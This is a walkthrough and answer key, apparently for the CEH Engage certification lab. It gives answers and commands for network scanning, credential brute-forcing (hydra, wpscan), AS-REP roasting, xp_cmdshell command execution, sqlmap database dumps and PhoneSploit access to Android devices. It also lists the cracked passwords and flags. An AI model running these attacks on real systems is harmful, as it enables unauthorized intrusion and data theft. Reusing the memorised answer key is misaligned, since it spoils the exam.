@@ -1,0 +1,462 @@
+========================================================================================================
+[[[[[[[[[[[[[[CEH Engage_Part-1]]]]]]]]]]]]]]]]]]]]]
+----------------------------------------------------
+========================================================================================================
+Challenge 1:
+An attacker conducted footprinting on a web application and saved the resulting report Dumpster.xlsx in the documents folder of EH Workstation-1. Your task is to analyze this report and identify the hostname associated with the IP address 173.245.59.176. (Format: aaaaa.aa.aaaaaaaaaa.aaa)
+=henry.ns.cloudflare.com
+
+-------------------------------------------
+Challenge 2:
+Identify the number of live machines in 192.168.10.0/24 subnet. (Format: N)
+=5
+
+nmap -sn 192.168.10.0/24
+-------------------------------------------
+Challenge 3:
+Identify the IP address of a Linux-based machine with port 22 open in the target network 192.168.10.0/24 (Format: NNN.NNN.NN.NNN).
+=192.168.10.111
+
+nmap -sV -T5 -O -p22 --open 192.168.10.0/24
+-------------------------------------------
+Challenge 4:
+Find the IP address of the Domain Controller machine in 192.168.0.0/24. (Format: NNN.NNN.N.NNN)
+=192.168.0.222
+
+nmap -sV -T5 --open -oN 192.168.0.0_sv.txt
+-------------------------------------------
+Challenge 5:
+Perform a host discovery scanning and identify the NetBIOS_Domain_Name of the host at 192.168.0.222. (Format: AAAAA.AAA)
+=SKILL.CEH
+
+nmap -sV -sC -T5 --open -oN 192.168.0.0_full.txt  192.168.0.0/24
+grep NeBIOS_Domain_name 192.168.0.0_full.txt
+-------------------------------------------
+Challenge 6:
+Perform an intense scan on 192.168.0.222 and find out the DNS_Tree_Name of the machine in the network. (Format: AAAAA.AAA.aaa)
+=SKILL.CEH.com
+
+grep DNS_Tree_Name 192.168.0.0_full.txt
+-------------------------------------------
+Challenge 7:
+While performing a security assessment against the CEHORG network, you came to know that one machine in the network is running OpenSSH and is vulnerable. Identify the version of the OpenSSH running on the machine. Note: Target network 192.168.10.0/24. (Format: N.NaN)
+=8.9p1
+
+nmap -sV -T5 -p 22 --open 192.168.10.0/24
+-------------------------------------------
+Challenge 8:
+During a security assessment, it was found that a server was hosting a website that was susceptible to blind SQL injection attacks. Further investigation revealed that the underlying database management system of the site was MySQL. Determine the machine OS that hosted the database. Note: Target network 172.30.10.0/24 (Format: Aaaaaa)
+=ubuntu
+
+nmap -sV -T5 -p 3306 -O --open 172.30.10.0/24
+-------------------------------------------
+Challenge 9:
+Perform an intense scan on target subnet 192.168.10.0/24 and determine the IP address of the machine hosting the MSSQL database service. (Format: NNN.NNN.NN.NNN)
+=192.168.10.144
+
+nmap -sV -T5 -p1433 --open 192.168.10.0/24
+-------------------------------------------
+Challenge 10:
+Perform a DNS enumeration on www.certifiedhacker.com and find out the name servers used by the domain. (Format: aaN.aaaaaaaa.aaa, aaN.aaaaaaaa.aaa)
+=ns1.bluehost.com, ns2.bluehost.com
+
+dnsenum www.certifiedhacker.com
+nslookup
+set type=ns
+www.certifiedhacker.com
+-------------------------------------------
+Challenge 11:
+Find the IP address of the machine running SMTP service on the 172.30.10.0/24 network. (Format: NNN.NN.NN.NNN)
+=172.30.10.200
+
+nmap -sV -T5 -p25 --open 172.30.10.0/24
+-------------------------------------------
+Challenge 12:
+Perform an SMB Enumeration on 172.30.10.200 and check whether the Message signing feature is required. Give your response as Yes/No.
+=NO
+
+nmap -p 445 --script smb2-security-mode 172.30.10.200
+#Not Required
+-------------------------------------------
+Challenge 13:
+Perform a vulnerability assessment on the 2023 CWE Top 25 most dangerous software vulnerabilities and determine the weakness ID of the last entry on the list. (Format: NNN)
+=276
+
+#search this challenge on chatgpt
+-------------------------------------------
+Challenge 14:
+Perform vulnerability scanning for the Linux host in the 192.168.10.0/24 network using OpenVAS and find the QoD percentage of vulnerabilitiy with severity level as medium. (Format: NN)
+=70
+
+[OpenVAS run+ Issue solved]
+docker run -d -p 443:443 –-name openvas mikesplain/openvas
+https://localhost:443
+admin/admin
+#1. Add cidr to Cofiguration
+#2. Scans>Tasks>Action
+-------------------------------------------
+Challenge 15:
+Perform a vulnerability scan on the host at 192.168.10.144 using OpenVAS and identify any FTP-related vulnerability. (Format: AAA Aaaaaaaaa Aaaaaaaaa Aaaaa )
+=FTP Unencrypted Cleartext Login
+
+[OpenVas]
+#Scans > Reports> Click on under the Date Tab(If it is not showing anything then wait, bcz scan is not complete yet)
+
+
+========================================================================================================
+[[[[[[[[[[[[[[CEH Engage_Part-2]]]]]]]]]]]]]]]]]]]]]
+----------------------------------------------------
+========================================================================================================
+Challenge 1:
+You are assigned to perform brute-force attack on a linux machine from 192.168.10.0/24 subnet and crack the FTP credentials of user nick. An exploitation information file is saved in the home directory of the FTP server. Determine the Vendor homepage of the FTP vulnerability specified in the file. (Format: aaaaa://aaa.aaaaaaaa.aaa/)
+=https://www.crushftp.com/
+
+nmap -p 21 --open 192.168.10.0/24 -oG ftp.txt
+grep 21 ftp.txt
+hydra -l nick -P rockyou.txt ftp://192.168.10.111 -v
+nick:apple
+-------------------------------------------------------
+Challenge 2:
+An intruder performed network sniffing on a machine from 192.168.10.0/24 subnet and obtained login credentials of the user for moviescope.com website using remote packet capture in wireshark. You are assigned to analyse the Mscredremote.pcapng file located in Downloads folder of EH Workstation-1 and determine the credentials obtained. (Format: aaaa/aaaaa)
+=kety/apple
+
+wireshark filter: http.request.method == "post"
+-------------------------------------------------------
+Challenge 3:
+You are assigned to analyse a packet capture file ServerDoS.pcapng located in Downloads folder of EH Workstation-2 machine. Determine the UDP based application layer protocol which attacker employed to flood the machine in targeted network.
+Note: Check for target Destination port. (Format: Aaaaa Aaaaaaa Aaaaaaaa)
+=Quake Network Protocol
+
+wireshark:udp
+-------------------------------------------------------
+Challenge 4:
+A severe DDoS attack is occurred in an organization, degrading the performance of a ubuntu server machine in the SKILL.CEH network. You are assigned to analyse the DD_attack.pcapng file stored in Documents folder of EH workstation -2 and determine the IP address of the attacker trying to attack the target server through UDP. (Format: NNN.NNN.NN.NNN)
+=192.168.10.144
+
+Wireshark filter:udp
+#Always check src port and dst port before ans submition
+-------------------------------------------------------
+Challenge 5:
+You are assigned to analyse PyD_attack.pcapng file stored in Downloads folder of EH Workstation -2 machine. Determine the attacker IP machine which is targeting the RPC service of the target machine. (Format: NNN.NN.NN.NN)
+=172.30.10.99
+tcp.port == 135 || tcp.port == 111
+-------------------------------------------------------
+Challenge 6:
+An incident handler identified severe DDoS attack on a network and provided report using Anti-DDoS Guardian tool. You are assigned to analyse the reports submitted by the IH team which are stored in "C:\Users\Admin\Documents\Anti-DDoS" directory of the EH Workstation-1 and determine the attacker IP which has transmitted more number of packets to the target machine. (Format: NNN.NNN.NN.NNN)
+=192.168.10.222
+-------------------------------------------------------
+Challenge 7:
+You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: aNaaN*NNN)
+=c3ll0@123
+
+GetNPUsers.py SKILL.CEH/ -no-pass -usersfile users.txt -dc-ip 192.168.0.222 -format john -outputfile hashes.asrep
+john --wordlist=rockyou.txt hashes.asrep
+$krb5asrep$Joshua@SKILL.CEH:c3ll0@123
+-------------------------------------------------------
+Challenge 8:
+A client machine under the target domain controller has a misconfigured SQL server vulnerability. Your task is to exploit this vulnerability, retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: N)
+=7
+
+hydra -L users.txt -P rockyou.txt mssql://192.168.10.144
+Server_mssrv:Spidy
+
+mssqlclient.py Server_mssrv@192.168.10.144
+xp_cmdshell "dir C:\ /s /b | findstr /i MSS.txt"
+xp_cmdshell "type C:\Users\Public\Downloads\MSS.txt"
+H3ll0!!
+
+#Or you can try msfconsole (Though it didn't worked)
+use exploit/windows/mssql/mssql_payload
+-------------------------------------------------------
+Challenge 9:
+You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: Aaaaaaa@NNNN)
+=Pumpkin@1234
+
+hydra -l Maurice -P rockyou.txt rdp://192.168.10.222 -v
+-------------------------------------------------------
+Challenge 10:
+You are assigned to perform malware scanning on a malware file Tools.rar stored in Downloads folder of EH workstation-2 machine and determine the last four digits of the file’s SHA-256 hash value. (Format: aNNN)
+=d282
+
+sha256sum Tools.rar
+-------------------------------------------------------
+Challenge 11:
+You are assigned to monitor a suspicious process running in a machine whose log file Logfile.PML is saved in Pictures folder of the EH Workstation -2. Analyse the logfile and determine the Parent PID of the malicious file H3ll0.exe process from the log file. (Format: NNNN)
+=6952
+
+procman.exe (win tools)
+--------------------------------------------------
+Challenge 12:
+You are assigned to analyse a ELF executable file Tornado.elf stored in Downloads folder of EH Workstation -2. Determine the Entropy value of the file as answer. (Format: N*NNNNN)
+=2.87903
+
+Win tool: Die
+-------------------------------------------------------
+Challenge 13:
+You are assigned to scan the target subnets to identify the remote packet capture feature that is enabled to analyse the traffic on the target machine remotetly. Scan the target subnets and determine the IP address using rpcap service. (Format: NNN.NNN.NN.NNN)
+=192.168.10.144
+
+nmap -p2002 -sV -T4 --open 192.168.10.0/24
+-------------------------------------------------------
+Challenge 14:
+An insider attack occurred in an organization and the confidential data regarding an upcoming event is sniffed and encrypted in a image file stealth.jpeg stored in Desktop of EH Workstation -2 machine. You are assigned to extract the hidden data inside the cover file using steghide tool and determine the tender quotation value. (Use azerty@123 for passphrase) (Format: NNNNNNN)
+=3965222
+steghide --extract -sf stealth.jpeg
+-------------------------------------------------------
+Challenge 15:
+Perform vulnerability search using searchsploit tool and determine the path of AirDrop 2.0 vulnerability. (Format: aaaaaaa/aaa/NNNNN.a)
+=android/dos/46445.c
+
+searchsploit AirDrop 2.0
+-------------------------------------------------------
+========================================================================================================
+[[[[[[[[[[[[[[CEH Engage_Part-3]]]]]]]]]]]]]]]]]]]]]
+----------------------------------------------------
+========================================================================================================
+
+Challenge 1:
+An attacker tried to perform session hijacking on a machine from 172.30.10.0/24 subnet. An incident handler found a packet capture file $_Jack.pcapng obtained from the victim machine which is stored in Documents folder of EH Workstation -1. You are assigned to analyse the packet capture file and determine the IP of the victim machine targeted by the attacker. (Format: NNN.NN.NN.NNN)
+=172.30.10.200
+
+ip.src == 172.30.10.0/24 or ip.dst == 172.30.10.0/24
+tcp #we can  see source port: 49914 and dst port: 443 (it defines the session hijacking)
+-------------------------------------------
+Challenge 2:
+An attacker tried to intercept a login session by intercepting the http traffic from the victim machine. The security analyst captured the traffic and stored it in Downloads folder of EH Workstation -1 as Intercep_$niffer.pcapng. Analyse the pcap file and determine the credentials captured by the attacker. (Format: aaa/aaaa)
+=lee/test
+http.request.method=="POST"
+-------------------------------------------
+Challenge 3:
+A honeypot has been set up on a machine within the 192.168.10.0/24 subnet to monitor and detect malicious network activity. Your task is to analyze the honeypot log file, cowrie.log, located in the Downloads folder of EH Workstation -2, and determine the attacker IP trying to access the target machine. (Format: NNN*NN*NN*NN)
+=172.30.10.99
+grep -i login cowrie.log
+-------------------------------------------
+Challenge 4:
+Conduct a footprinting analysis on the target website www.certifiedhacker.com to determine the content length. (Format: NNN)
+=347
+nc -vv www.certifiedhacker.com 80
+-------------------------------------------
+Challenge 5:
+You’re a cybersecurity investigator assigned to a high-priority case. Martin is suspected of engaging in illegal crypto activities, and it’s believed that he has stored his crypto account password in a file named $ollers.txt. Your mission is to crack the SSH credentials for Martin’s machine within the 192.168.10.0/24 subnet and retrieve the password from the $ollers.txt file. (Hint: Search in the folders present on the Desktop to find the target file) (Format: aNaa**NNNNNAA*)
+=i2tr&^72546HJ*
+
+hydra -l Martin -P rockyou.txt ssh://192.168.10.101 -v
+Martin:qwerty1234
+ssh Martin@192.168.10.101
+-------------------------------------------
+Challenge 6:
+Attackers have identified a vulnerable website and stored the details of this website on one of the machines within the 192.168.10.0/24 subnet. As a cybersecurity investigator you have been tasked to crack the FTP credentials of user nick and determine the ID of the domain. The information you need has been gathered and stored in the w_domain.txt file. (Format: NNNNNNNNNN)
+=7867721010
+
+hydra -l nick -P rockyou.txt ssh://192.168.10.111 -v
+nick:apple
+ftp 192.168.10.111
+-------------------------------------------
+Challenge 7:
+You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer. (Format: Aa*aaNNNN)
+=Ch@mp2022
+
+nmap -sV -T4 -p8080 172.30.10.0/24
+172.30.10.99	8080 http Apache Tomcat/Coyote JSP engine 1.1
+writeup: https://github.com/3ls3if/Cybersecurity-Notes/blob/main/readme/ceh-engage-walkthrough/ceh-engage-part-3.md
+-------------------------------------------
+Challenge 8:
+You are a penetration tester assigned to a new task. A list of websites is stored in the webpent.txt file on the target machine with the IP address 192.168.10.101. Your objective is to find the Meta-Author of the website that is highlighted in the list. (Hint: Use SMB service) (Format: AA-Aaaaaaa)
+=EC-Council
+
+[They played a dirty Trick here]
+hydra -L users.txt -P rockyou.txt smb://192.168.10.101
+martin:qwerty1234
+
+smbclient //192.168.10.101/Users -U martin%qwerty1234
+#We didn't get any file called webpent.txt so we verified again by this below command
+smbclient //192.168.10.101/Users -U martin%qwerty1234 -c 'recurse ON; dir' | grep -i 'webpent.txt'
+webpent.txt A 98 Tue Sep 10 08:17:56 2024 #We can see it's exist here but not showing the path
+
+
+#Now as we know earlier we cracked SSH so we login with ssh
+ssh martin@192.168.10.101
+dir "\webpent.txt" /s
+type C:\Documents and Settings\Martin\My Documents\My Music\webpent.txt
+curl -s www.moviescope.com | grep -i author
+-------------------------------------------
+Challenge 9:
+You have recently joined GoodShopping Inc. as a web application security administrator. Eager to understand the security landscape of the company’s website, www.goodshopping.com, you decide to investigate the security updates that have been made over time. Your specific task is to identify the attack category of the oldest Common Vulnerabilities and Exposures (CVEs) affected the website. (Format: aaaaa*aaaa aaaaaaaaaa (AAA) )
+=Cross-site Scripting (XSS)
+
+zap(cve-2020-11023)
+-------------------------------------------
+Challenge 10:
+You are a web penetration tester hired to assess the security of the website www.goodshopping.com. Your primary task is to identify the type of security policies is missing to detect and mitigate Cross-Site Scripting (XSS) and SQL Injection attacks. (Format: Aaaaaaa Aaaaaaaa Aaaaaa)
+=Content Security Policy
+
+zap
+-------------------------------------------
+172.30.10.200
+lee/test
+172.30.10.99
+347
+i2tr&^72546HJ*
+7867721010
+Ch@mp2022
+EC-Council
+cross-site scripting (XSS)
+Content Security Policy
+-------------------------------------------
+Challenge 11:
+You are part of a cybersecurity team investigating an internal website that has been copied from a legitimate site without authorization. One of your teammates, acting as a spy, has scanned the website using a smart scanner within the subnet 192.168.10.0/24. Your task is to identify the number of Directory Listing of Sensitive Files on this website. The report, named w_report.pdf, is available on the target machine.(Hint: He remembered the OS as Windows Server 19 while scanning the website) (Format: NN)
+=36
+
+hydra -L users.txt -P rockyou.txt mssql://192.168.10.144
+Server_mssrv:Spidy
+
+mssqlclient.py Server_mssrv@192.168.10.144
+xp_cmdshell "dir C:\ /s /b | findstr /i w_report.pdf"
+xp_cmdshell "dir C:\Users\Public\Documents\w_report.pdf"
+xp_cmdshell "copy C:\Users\Public\Documents\w_report.pdf C:\inetpub\wwwroot\"
+#you can try exploit/windows/mssql/mssql_payload (though it didn't worked)
+
+#Now see the w_report.pdf
+http://192.168.10.144/w_report.pdf #(ctrl +f = directory)
+-------------------------------------------
+Challenge 12:
+Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)
+=orange1234
+
+wig www.cehorg.com
+#it's reffering to cehorg.com
+WordPress
+wpscan --url http://cehorg.com/wp-login.php -U adam -P rockyou.txt
+-------------------------------------------
+Challenge 13:
+As a cybersecurity analyst, your task is to identify potential vulnerabilities on the moviescope.com website. Your manager has requested a specific number of risk categories. The required HTML file is located on EH Workstation 1. (Format: N)
+=3
+
+#Go to Workstation 1 > videos > www.moviescope.com_09112024_538.html
+-------------------------------------------
+Challenge 14:
+Perform a SQL Injection attack on www.moviescope.com and find out the number of users available in the database. (Format: N)
+=5
+
+'or 1=1 --
+sqlmap -u http://www.moviescope.com/viewprofile.aspxid=1 --cookie="mscope=1j@ydNf8wro=; ui-tabs-1=0" -D moviescope -T User_Profile --dump
+-------------------------------------------
+Challenge 15:
+Perform a SQL Injection vulnerability scan on the target website www.moviescope.com and determine the WASC ID for SQL Injection (Format: NN)
+=19
+google:WASC ID
+
+#For your learning we can get of this id by just googling
+SQL Injection
+WASC ID   : 19
+CWE ID    : 89
+OWASP A10 : A03:2021 - Injection
+CAPEC ID  : 66
+-------------------------------------------
+
+========================================================================================================
+[[[[[[[[[[[[[[CEH Engage_Part-4]]]]]]]]]]]]]]]]]]]]]
+----------------------------------------------------
+========================================================================================================
+
+Challenge 1:
+An employee's mobile device within CEHORG has been compromised, leading to an encrypted message BCtetx.txt being placed on the Android operating system. The password needed to decrypt the file is saved on EH-workstation-1. As an ethical hacker, your task is to decrypt the file using the password and input the extracted information. (note: the password file pawned.txt is stored in documents folder). (Format: *aaaaAN*NaN )
+=(ryptD3(0d3
+
+#1. From pawned.txt: Pa$$w0rd
+#2. Phonesploit > 192.168.10.121 > /sdcard/Download
+#3. Win Tools: BCTextEncoder.exe
+-------------------------------------------
+Challenge 2:
+A compromised Android device is suspected of containing malicious applications. As an ethical hacker, you are tasked with identifying and extracting all installed APK files. Within these APKs, you must locate and extract a specific CRC value ends with "614c" . This CRC value is believed to be a crucial component of a larger security breach investigation. Determine the complete CRC value as answer. (Format: NNaaNNNa)
+=53ac614c
+
+#1. Phonesploit> 14 > 36 (Extract all 1,2,3)
+#2. Wintool: HashMyFiles (Open folder)
+-------------------------------------------
+Challenge 3:
+A ZIP archive encompassing redundant images of a physical signature has been compromised signature.zip and stored in Documents folder of EH Workstation-1 machine. Your role as an ethical hacker involves a forensic examination of the archive's contents to pinpoint the image file associated with an MD5 hash value ends with sequence "24CCB". Determine the original signature file name as answer. (Format: aN*aaa)
+=k4.png
+
+Tools: HashMyFiles
+-------------------------------------------
+Challenge 4:
+As a cybersecurity analyst, you are investigating a potential phishing campaign targeting Ruby, an employee at a local tech company. You have access to Ruby’s call log from the past few days, stored on an Android device within the target subnet 192.168.10.0/24. Identify the call in the log that is most likely a phishing attempt and provide the suspected phone number. (Format: +N (NNN) NNN-NNNN )
+=+1 (555) 678-9012
+
+nmap -sV -T4 -p5555 --open 192.168.10.0/24
+192.168.10.121
+Phonesploit> /sdcard/calls
+cat call_log_dump.log.txt (check the call related from bank)
+-------------------------------------------
+Challenge 5:
+An employee's mobile device has reportedly been compromised and is suspected of being used to launch a Denial of Service (DoS) attack against one of the company's internal servers. Your assignment is to conduct a thorough analysis of the network capture file "And_Dos.pcapng" located in the Documents directory of EH workstation-2 machine and identify the severity level/potential impact of the attack performed. (perform deep down Expert Info analysis). (Format: Aaaaaaa)
+=Warning
+
+Wireshark:udp
+Wireshark: Analyse > Expert Information
+-------------------------------------------
+Challenge 6:
+CEHORG manages multiple IoT devices and sensors to oversee its supply chain fleet. You are tasked with examining the file "MQTT.pcapng," located in the Home directory of the EH Workstation - 2 machine. Analyze the packet containing the "High_humidity" message and determine the alert percentage specified in the message. (Format: NN )
+=50
+
+Wireshark:mqtt > (Publish Message(double click))
+-------------------------------------------
+Challenge 7:
+An attacker had sent a file cryt-128-06encr.hex containing ransom file password, which is located in documents folder of EH-workstation-2. You are assigned a task to decrypt the file using cryp tool. Perform cryptanalysis, Identify the algorithm used for file encryption and hidden text. Note: check filename for key length and hex characters. (Format: Aaaaaaa/**aa**aA*a)
+=Twofish/@!ph@|tE*t
+
+Tools: CrypTool > Encrypt/Decrypt > Symmetric(modern) > Futher Algorithms > Twofish > Key length(bits) > Change keys (06 06 06 06 all)
+#The filename `cryt-128-06encr.hex` likely indicates an encrypted file (encr = encrypted) using a 128-bit algorithm (possibly Twofish-128) in hex format (.hex), with `06` possibly representing a version, date, or key index.
+-------------------------------------------
+Challenge 8:
+A VeraCrypt volume file "MyVeracrypt" is stored on the Document folder of the EH Workstation – 1 machine. You are an ethical hacker working with CEHORG; you have been tasked to decrypt the encrypted volume and determine the number of files stored in the volume folder. (Hint: Password: veratest). (Format: N )
+=4
+
+Tools: VeraCrypt
+-------------------------------------------
+Challenge 9:
+An ex-employee of CEHORG is suspected of performing an insider attack. You are assigned a task to retrieve the contacts dump from the employee's Android phone. Using PhoneSploit, find the country code of the contact named "Maddy." (Note: Use option 'N' in PhoneSploit for next page.). (Format: NN )
+=61
+
+PhoneSploit> 34. Dump All Contacts
+grep -i Maddy contacts_dump.txt
+-------------------------------------------
+Challenge 10:
+CEHORG manages multiple IoT devices and sensors to oversee its supply chain fleet. You are tasked with examining the file "MQTT.pcapng," located in the Home directory of the EH Workstation - 2 machine. Analyze the packet containing the "High_temperature" message and determine the topic length . (Format: NN )
+=16
+
+Wireshark: mqtt
+-------------------------------------------
+Challenge 11:
+An ex-employee of CEHORG is suspected to be performing insider attack. You are assigned a task to attain KEYCODE-5 used in the employees' mobile phone. Note: use option N in PhoneSploit for next page. (Format: Aaaaa*Aaaaaa)
+=Power Button
+
+PhoneSploit> 39
+-------------------------------------------
+Challenge 12:
+An employee in CEHORG has secretly acquired Confidential access ID through an application from the company. He has saved this information on the Music folder of his Android mobile phone. You have been assigned a task as an ethical hacker to access the file and delete it covertly. Enter the account information present in the file. Note: Only provide the numeric values in the answer field. (Format: NNNNNNNN)
+=80099889
+
+PhoneSploit>sdcard/Music
+-------------------------------------------
+Challenge 13:
+An attacker has hacked an employee's Android device at CEHORG and initiated a LOIC attack from the device. As an ethical hacker, you have obtained a screenshot of the attack using a background application. Retrieve the screenshot of the attack using PhoneSploit from the compromised mobile device and determine the number of HTTP packets sent per second. (Format: NN)
+=23
+
+PhoneSploit > /sdcard/music
+find . -iname "*.png"
+-------------------------------------------
+Challenge 14:
+You have received a folder named "Archive" from a vendor. You suspect that someone might have tampered with the files during transmission. The Original hashes of the files have been sent by the sender separately and are stored in a file named FileHashes.txt stored in the Document folder in the "EH Workstation – 2" machine. Your task is to check the integrity of the files by comparing the MD5 hashes. Compare the hash values and determine the file name that has been tampered with. Note: Exclude the file extension in the answer field. The answer is case-sensitive. (Format: Aaaaaa)
+=Quotes
+
+#1. /home/attacker/Documents/FileHaches.txt
+#2. /home/attacker/Documents/Archive > md5sum *
+#3. Check the differ 
+-------------------------------------------
+Challenge 15:
+A VeraCrypt volume file "secret" is stored on the Document folder in the EH Workstation – 2 machine. You are an ethical hacker working with CEHORG; you have been tasked to decrypt the encrypted volume and determine the number of files stored in the volume. (Hint: Password: test). (Format: N)
+=6
+#Tools: VeraCrypt
+-------------------------------------------
